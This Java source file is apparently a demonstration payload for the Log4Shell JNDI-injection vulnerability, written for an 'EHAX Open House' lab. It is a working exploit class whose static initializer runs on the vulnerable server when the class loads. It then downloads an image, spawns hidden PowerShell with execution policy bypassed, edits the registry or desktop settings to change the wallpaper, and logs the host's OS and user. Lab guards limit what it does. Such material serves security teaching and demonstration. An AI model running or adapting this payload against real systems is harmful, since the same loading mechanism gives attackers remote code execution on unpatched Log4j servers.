import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Hashtable;
import java.util.Locale;
import java.util.TimeZone;
import java.util.concurrent.TimeUnit;

/**
 * EHAX Open House - benign Log4Shell demo payload.
 *
 * What it does:
 *   1. Checks that EHAX_LAB=1 is present in the server process environment.
 *   2. Downloads ehax-wallpaper.png from the same private HTTP codebase
 *      that served this class (or from EHAX_WALLPAPER_URL).
 *   3. Sets it as the current user's desktop wallpaper.
 *   4. Optionally plays a short system sound when EHAX_PAYLOAD_SOUND=1.
 *   5. Appends a line to the temp-dir proof/log file.
 *
 * It deliberately does NOT open a shell, read user files, persist, or make
 * outbound connections outside the lab subnet. The wallpaper is the payload.
 *
 * Compile for Java 8:
 *   javac --release 8 WallpaperPayload.java
 *
 * Class name and file name must stay in sync because the JNDI referral uses
 * the class name as the factory: WallpaperPayload.
 */
public class WallpaperPayload implements ObjectFactory {

    private static final String TAG = "[EHAX] ";
    private static final String LAB_ENV = "EHAX_LAB";
    private static final int MAX_IMAGE_BYTES = 8 * 1024 * 1024;
    private static volatile boolean alreadyRan = false;

    static {
        runOnce();
    }

    public WallpaperPayload() {
        // JNDI may instantiate the factory after loading the class. The static
        // initializer has already run by then; runOnce() is idempotent.
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                    Hashtable<?, ?> environment) {
        runOnce();
        // Log4j 2.0-beta9's JndiLookup casts the result to String. Returning a
        // harmless string keeps the demo log clean instead of throwing a
        // ClassCastException in every appender. The payload has already run
        // in the static initializer above.
        return "[EHAX]";
    }

    private static synchronized void runOnce() {
        if (alreadyRan) {
            return;
        }
        alreadyRan = true;

        try {
            if (!"1".equals(System.getenv(LAB_ENV))) {
                log("refusing to run: " + LAB_ENV + " is not set to 1");
                return;
            }

            // Log4j 2.0-beta9 can process the same chat line once per appender.
            // A short-lived marker keeps the wallpaper change to one action
            // while still allowing a second demo batch a few seconds later.
            File marker = new File(System.getProperty("java.io.tmpdir"), "ehax-payload-last-run");
            long now = System.currentTimeMillis();
            if (marker.isFile() && now - marker.lastModified() < 5000L) {
                log("deduplicated: another appender ran this payload in the last 5s");
                return;
            }
            try {
                if (!marker.exists()) {
                    marker.createNewFile();
                }
                marker.setLastModified(now);
            } catch (Throwable ignored) {
            }

            log("payload started on " + System.getProperty("os.name")
                    + " " + System.getProperty("os.version")
                    + " / Java " + System.getProperty("java.version"));
            log("running as user " + System.getProperty("user.name"));

            File wallpaper = fetchWallpaper();
            if (wallpaper == null || !wallpaper.isFile() || wallpaper.length() == 0) {
                log("failed to obtain wallpaper image");
                proof("download-failed");
                return;
            }

            log("wallpaper image: " + wallpaper.getAbsolutePath()
                    + " (" + wallpaper.length() + " bytes)");

            if ("1".equals(System.getenv("EHAX_PAYLOAD_DRY_RUN"))) {
                log("dry run: skipping wallpaper change");
                proof("dry-run-ok");
                return;
            }

            boolean changed = setWallpaper(wallpaper);
            log("setWallpaper returned " + changed);
            proof(changed ? "wallpaper-changed" : "wallpaper-failed");

            if ("1".equals(System.getenv("EHAX_PAYLOAD_SOUND"))) {
                playSound();
            }
        } catch (Throwable t) {
            log("unexpected error: " + t);
            proof("error:" + t.getClass().getSimpleName());
        }
    }

    // ---------------------------------------------------------------------
    // Download
    // ---------------------------------------------------------------------

    private static File fetchWallpaper() {
        try {
            URL url = wallpaperUrl();
            if (url == null) {
                return null;
            }
            log("downloading " + url);

            String host = url.getHost();
            if (!isPrivateLabHost(host)) {
                log("refusing non-private wallpaper host: " + host);
                return null;
            }

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(6000);
            conn.setInstanceFollowRedirects(false);
            conn.setRequestProperty("User-Agent", "EHAX-OpenHouse/1.0");
            try {
                int code = conn.getResponseCode();
                if (code != HttpURLConnection.HTTP_OK) {
                    log("wallpaper HTTP status " + code);
                    return null;
                }
                long declared = conn.getContentLengthLong();
                if (declared > MAX_IMAGE_BYTES) {
                    log("wallpaper too large: " + declared);
                    return null;
                }

                File out = new File(System.getProperty("java.io.tmpdir"), "ehax-wallpaper.png");
                InputStream in = conn.getInputStream();
                OutputStream os = new FileOutputStream(out);
                try {
                    byte[] buf = new byte[8192];
                    int total = 0;
                    int n;
                    while ((n = in.read(buf)) != -1) {
                        total += n;
                        if (total > MAX_IMAGE_BYTES) {
                            log("wallpaper exceeded size limit while reading");
                            return null;
                        }
                        os.write(buf, 0, n);
                    }
                } finally {
                    try { in.close(); } catch (IOException ignored) { }
                    try { os.close(); } catch (IOException ignored) { }
                }
                return out;
            } finally {
                conn.disconnect();
            }
        } catch (Throwable t) {
            log("download error: " + t);
            return null;
        }
    }

    private static URL wallpaperUrl() throws Exception {
        String override = System.getenv("EHAX_WALLPAPER_URL");
        if (override != null && !override.trim().isEmpty()) {
            return new URL(override.trim());
        }

        URL self = WallpaperPayload.class.getResource("WallpaperPayload.class");
        if (self == null) {
            log("cannot determine own class URL");
            return null;
        }
        String text = self.toString();
        int slash = text.lastIndexOf('/');
        if (slash < 0) {
            log("unexpected class URL: " + text);
            return null;
        }
        String base = text.substring(0, slash + 1);
        return new URL(base + "ehax-wallpaper.png");
    }

    private static boolean isPrivateLabHost(String host) {
        if (host == null || host.isEmpty()) {
            return false;
        }
        try {
            InetAddress[] addresses = InetAddress.getAllByName(host);
            if (addresses.length == 0) {
                return false;
            }
            for (InetAddress address : addresses) {
                if (address.isLoopbackAddress()
                        || address.isSiteLocalAddress()
                        || address.isLinkLocalAddress()) {
                    continue;
                }
                return false;
            }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    // ---------------------------------------------------------------------
    // Wallpaper setters
    // ---------------------------------------------------------------------

    private static boolean setWallpaper(File image) {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        try {
            if (os.contains("win")) {
                return setWindowsWallpaper(image);
            }
            if (os.contains("mac") || os.contains("darwin")) {
                return setMacWallpaper(image);
            }
            return setLinuxWallpaper(image);
        } catch (Throwable t) {
            log("wallpaper setter error: " + t);
            return false;
        }
    }

    private static boolean setWindowsWallpaper(File image) {
        String path = image.getAbsolutePath();
        File script = new File(System.getProperty("java.io.tmpdir"), "ehax-wallpaper.ps1");
        String ps = "$ErrorActionPreference = 'Stop'\n"
                + "$img = '" + path.replace("'", "''") + "'\n"
                + "Add-Type -TypeDefinition @'\n"
                + "using System.Runtime.InteropServices;\n"
                + "public static class EhaxWallpaper {\n"
                + "  [DllImport(\"user32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]\n"
                + "  public static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);\n"
                + "}\n"
                + "'@\n"
                + "$ok = [EhaxWallpaper]::SystemParametersInfo(20, 0, $img, 3)\n"
                + "if (-not $ok) { exit 1 }\n";
        try {
            Files.write(script.toPath(), ps.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            log("cannot write PowerShell helper: " + e);
            return false;
        }

        String powershell = "powershell.exe";
        String root = System.getenv("SystemRoot");
        if (root != null) {
            File candidate = new File(root, "System32\\WindowsPowerShell\\v1.0\\powershell.exe");
            if (candidate.isFile()) {
                powershell = candidate.getAbsolutePath();
            }
        }

        int rc = run(12, powershell, "-NoProfile", "-NonInteractive",
                "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
                "-File", script.getAbsolutePath());
        log("PowerShell wallpaper exit code: " + rc);
        if (rc == 0) {
            return true;
        }

        // Fallback for older Windows / constrained PowerShell.
        log("trying registry fallback");
        int rc1 = run(5, "reg", "add", "HKCU\\Control Panel\\Desktop",
                "/v", "Wallpaper", "/t", "REG_SZ", "/d", path, "/f");
        int rc2 = run(5, "reg", "add", "HKCU\\Control Panel\\Desktop",
                "/v", "WallpaperStyle", "/t", "REG_SZ", "/d", "10", "/f");
        int rc3 = run(5, "reg", "add", "HKCU\\Control Panel\\Desktop",
                "/v", "TileWallpaper", "/t", "REG_SZ", "/d", "0", "/f");
        int rc4 = run(5, "rundll32.exe", "user32.dll,UpdatePerUserSystemParameters");
        log("registry fallback codes: " + rc1 + "," + rc2 + "," + rc3 + "," + rc4);
        return rc1 == 0;
    }

    private static boolean setMacWallpaper(File image) {
        String path = image.getAbsolutePath().replace("\\", "\\\\").replace("\"", "\\\"");
        String script = "tell application \"System Events\" to set picture of every desktop to POSIX file \"" + path + "\"";
        int rc = run(8, "osascript", "-e", script);
        log("osascript wallpaper exit code: " + rc);
        return rc == 0;
    }

    private static boolean setLinuxWallpaper(File image) {
        String path = image.getAbsolutePath();
        String uri = "file://" + path;
        String desktop = (env("XDG_CURRENT_DESKTOP") + " " + env("DESKTOP_SESSION")).toLowerCase(Locale.ROOT);
        boolean changed = false;

        if (desktop.contains("cinnamon")) {
            changed |= gsettings("org.cinnamon.desktop.background", "picture-uri", uri);
            changed |= gsettings("org.cinnamon.desktop.background", "picture-options", "zoom");
        } else if (desktop.contains("mate")) {
            changed |= gsettings("org.mate.background", "picture-filename", path);
        } else if (desktop.contains("xfce")) {
            changed |= xfceWallpaper(path);
        } else if (desktop.contains("kde") || desktop.contains("plasma")) {
            changed |= kdeWallpaper(path, uri);
        } else {
            // GNOME, Unity, Budgie, Pantheon, and most GNOME-derived desktops.
            changed |= gsettings("org.gnome.desktop.background", "picture-uri", uri);
            // GNOME 42+ uses picture-uri-dark for the dark theme.
            gsettings("org.gnome.desktop.background", "picture-uri-dark", uri);
            gsettings("org.gnome.desktop.background", "picture-options", "zoom");
        }

        if (!changed) {
            changed |= tryCommand(6, "feh", "--bg-fill", path);
            changed |= tryCommand(6, "xwallpaper", "--zoom", path);
            changed |= tryCommand(6, "nitrogen", "--set-zoom-fill", path);
            changed |= tryCommand(6, "pcmanfm", "--set-wallpaper", path);
        }
        log("desktop=" + desktop.trim() + " changed=" + changed);
        return changed;
    }

    private static boolean gsettings(String schema, String key, String value) {
        int rc = run(6, "gsettings", "set", schema, key, value);
        if (rc != 0) {
            log("gsettings " + schema + " " + key + " -> " + rc);
        }
        return rc == 0;
    }

    private static boolean xfceWallpaper(String path) {
        boolean changed = false;
        String out = capture(6, "xfconf-query", "-c", "xfce4-desktop", "-l");
        if (out == null) {
            return false;
        }
        String[] lines = out.split("\\r?\\n");
        for (String line : lines) {
            String prop = line.trim();
            if (prop.endsWith("/last-image")) {
                int rc = run(6, "xfconf-query", "-c", "xfce4-desktop", "-p", prop, "-s", path);
                changed |= rc == 0;
            }
        }
        return changed;
    }

    private static boolean kdeWallpaper(String path, String uri) {
        if (tryCommand(8, "plasma-apply-wallpaperimage", path)) {
            return true;
        }
        String script = "var ds = desktops();"
                + "for (var i = 0; i < ds.length; i++) {"
                + "  var d = ds[i];"
                + "  d.wallpaperPlugin = 'org.kde.image';"
                + "  d.currentConfigGroup = ['Wallpaper', 'org.kde.image', 'General'];"
                + "  d.writeConfig('Image', '" + uri.replace("'", "\\'") + "');"
                + "}";
        int rc = run(8, "qdbus", "org.kde.plasmashell",
                "/PlasmaShell", "org.kde.PlasmaShell.evaluateScript", script);
        log("qdbus wallpaper exit code: " + rc);
        return rc == 0;
    }

    // ---------------------------------------------------------------------
    // Sound (optional)
    // ---------------------------------------------------------------------

    private static void playSound() {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        try {
            if (os.contains("win")) {
                run(5, "powershell.exe", "-NoProfile", "-NonInteractive",
                        "-WindowStyle", "Hidden", "-Command",
                        "[System.Media.SystemSounds]::Asterisk.Play()");
            } else if (os.contains("mac") || os.contains("darwin")) {
                run(5, "afplay", "/System/Library/Sounds/Glass.aiff");
            } else {
                File complete = new File("/usr/share/sounds/freedesktop/stereo/complete.oga");
                if (complete.isFile()) {
                    if (run(5, "paplay", complete.getAbsolutePath()) == 0) {
                        return;
                    }
                }
                if (run(5, "canberra-gtk-play", "-i", "complete") == 0) {
                    return;
                }
                // Java's beep is a last resort; it may be silent on headless JVMs.
                java.awt.Toolkit.getDefaultToolkit().beep();
            }
        } catch (Throwable t) {
            log("sound error: " + t);
        }
    }

    // ---------------------------------------------------------------------
    // Process helpers
    // ---------------------------------------------------------------------

    private static int run(long timeoutSeconds, String... command) {
        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            applyDesktopEnvironment(pb);
            pb.redirectErrorStream(true);
            process = pb.start();
            drain(process.getInputStream());
            if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                process.destroyForcibly();
                log("command timed out: " + command[0]);
                return -1;
            }
            return process.exitValue();
        } catch (Throwable t) {
            log("command failed (" + command[0] + "): " + t);
            return -1;
        } finally {
            if (process != null) {
                try { process.getInputStream().close(); } catch (IOException ignored) { }
            }
        }
    }

    private static boolean tryCommand(long timeoutSeconds, String... command) {
        return run(timeoutSeconds, command) == 0;
    }

    private static String capture(long timeoutSeconds, String... command) {
        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            applyDesktopEnvironment(pb);
            pb.redirectErrorStream(true);
            process = pb.start();
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            InputStream in = process.getInputStream();
            byte[] buf = new byte[4096];
            int n;
            long deadline = System.currentTimeMillis() + timeoutSeconds * 1000L;
            while (System.currentTimeMillis() < deadline && (n = in.read(buf)) != -1) {
                out.write(buf, 0, n);
                if (out.size() > 256 * 1024) {
                    break;
                }
            }
            if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
                process.destroyForcibly();
                return null;
            }
            return new String(out.toByteArray(), StandardCharsets.UTF_8);
        } catch (Throwable t) {
            log("capture failed (" + command[0] + "): " + t);
            return null;
        } finally {
            if (process != null) {
                try { process.getInputStream().close(); } catch (IOException ignored) { }
            }
        }
    }

    private static void drain(final InputStream in) {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                byte[] buf = new byte[4096];
                try {
                    while (in.read(buf) != -1) {
                        // discard
                    }
                } catch (IOException ignored) {
                }
            }
        }, "ehax-drain");
        t.setDaemon(true);
        t.start();
    }

    private static void applyDesktopEnvironment(ProcessBuilder pb) {
        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        if (!os.contains("linux") && !os.contains("mac")) {
            return;
        }
        if (pb.environment().get("DISPLAY") == null) {
            pb.environment().put("DISPLAY", ":0");
        }
        if (pb.environment().get("DBUS_SESSION_BUS_ADDRESS") == null) {
            String runtime = System.getenv("XDG_RUNTIME_DIR");
            if (runtime != null && new File(runtime, "bus").exists()) {
                pb.environment().put("DBUS_SESSION_BUS_ADDRESS", "unix:path=" + runtime + "/bus");
            } else {
                String user = System.getProperty("user.name");
                File bus = new File("/run/user", String.valueOf(currentUid(user)));
                if (bus.isDirectory()) {
                    pb.environment().put("DBUS_SESSION_BUS_ADDRESS", "unix:path=" + bus.getAbsolutePath() + "/bus");
                }
            }
        }
        if (pb.environment().get("XAUTHORITY") == null) {
            String home = System.getProperty("user.home");
            if (home != null) {
                File xauth = new File(home, ".Xauthority");
                if (xauth.isFile()) {
                    pb.environment().put("XAUTHORITY", xauth.getAbsolutePath());
                }
            }
        }
    }

    private static long currentUid(String user) {
        // Java has no portable getuid(); this is only a best-effort fallback.
        // The common demo path (EHAX server started from a logged-in terminal)
        // already has XDG_RUNTIME_DIR and DBUS_SESSION_BUS_ADDRESS set.
        try {
            if ("root".equals(user)) {
                return 0;
            }
            Process p = new ProcessBuilder("id", "-u").start();
            if (p.waitFor(2, TimeUnit.SECONDS) && p.exitValue() == 0) {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                InputStream in = p.getInputStream();
                byte[] buf = new byte[64];
                int n;
                while ((n = in.read(buf)) != -1) {
                    out.write(buf, 0, n);
                }
                return Long.parseLong(new String(out.toByteArray(), StandardCharsets.UTF_8).trim());
            }
        } catch (Throwable ignored) {
        }
        return -1;
    }

    // ---------------------------------------------------------------------
    // Logging
    // ---------------------------------------------------------------------

    private static String env(String key) {
        String value = System.getenv(key);
        return value == null ? "" : value;
    }

    private static String timestamp() {
        SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
        fmt.setTimeZone(TimeZone.getDefault());
        return fmt.format(new Date());
    }

    private static void log(String message) {
        String line = TAG + timestamp() + " " + message;
        System.err.println(line);
        appendTo(new File(System.getProperty("java.io.tmpdir"), "ehax-payload.log"), line);
    }

    private static void proof(String result) {
        String line = timestamp() + " " + result
                + " os=" + System.getProperty("os.name")
                + " user=" + System.getProperty("user.name");
        appendTo(new File(System.getProperty("java.io.tmpdir"), "ehax-payload-proof.txt"), line);
    }

    private static void appendTo(File file, String line) {
        try {
            Path path = file.toPath();
            Files.write(path, (line + System.lineSeparator()).getBytes(StandardCharsets.UTF_8),
                    java.nio.file.StandardOpenOption.CREATE,
                    java.nio.file.StandardOpenOption.APPEND);
        } catch (Throwable ignored) {
            // Never let demo logging break the payload.
        }
    }
}
